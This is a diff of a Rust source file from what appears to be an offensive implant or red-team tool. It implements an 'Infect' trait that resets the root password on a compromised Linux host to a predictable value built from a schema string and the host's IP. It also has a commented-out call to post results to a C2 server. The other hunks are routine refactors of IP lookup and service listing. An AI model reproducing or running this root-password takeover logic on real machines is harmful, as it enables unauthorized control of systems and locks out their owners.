@@ -1,4 +1,3 @@
-use pnet::datalink;
 use procfs::net::{route, unix, TcpNetEntry, TcpState, UdpNetEntry, UdpState};
 use procfs::process::FDTarget;
 use procfs::process::Stat;
@@ -44,7 +43,7 @@ impl From<&TcpState> for super::types::ConnectionState {
     }
 }
 
-fn change_password(username: &str, password: &str) -> std::io::Result<()> {
+fn passwd(username: &str, password: &str) -> std::io::Result<()> {
     match super::utils::CommandExecutor::execute_command(
         "passwd",
         Some(&[username]),
@@ -56,14 +55,14 @@ fn change_password(username: &str, password: &str) -> std::io::Result<()> {
 }
 
 impl super::types::Infect for crate::Host {
-    fn init(&self, schema: &str) {
+    fn change_password(&self, schema: &str) {
         // Change password based on Schema
         let password = format!(
             "{}{:?}!",
             schema,
             self.ip.split('.').last().unwrap().parse::<u16>().ok()
         );
-        let _ = change_password("root", password.as_str());
+        let _ = passwd("root", password.as_str());
 
         // Post Evil fetch results to C2
         // let _ = post_evil_results(&self.c2, &self.ip, &password);
@@ -157,32 +156,7 @@ impl super::types::OS for crate::Host {
     }
 
     fn ip() -> Box<str> {
-        let routes = match route() {
-            Ok(r) => r,
-            Err(_) => return "0.0.0.0".into(),
-        };
-
-        let intface = match routes
-            .iter()
-            .filter(|r| r.destination.is_unspecified())
-            .last()
-        {
-            Some(route) => route.iface.clone(),
-            None => return "0.0.0.0".into(),
-        };
-
-        let interfaces = datalink::interfaces();
-        let interface = interfaces
-            .into_iter()
-            .find(|iface| iface.name == intface.to_string());
-
-        match interface {
-            Some(iface) => match iface.ips.first() {
-                Some(ip) => ip.ip().to_string().into_boxed_str(),
-                None => "0.0.0.0".into(),
-            },
-            None => "0.0.0.0".into(),
-        }
+        local_ip::get_local_ip().into()
     }
 
     fn containers() -> Box<[super::types::Container]> {
@@ -617,7 +591,7 @@ impl InitSystem {
     }
 
     fn unknown() -> Box<[super::types::Service]> {
-        todo!()
+        Box::new([])
     }
 }
 
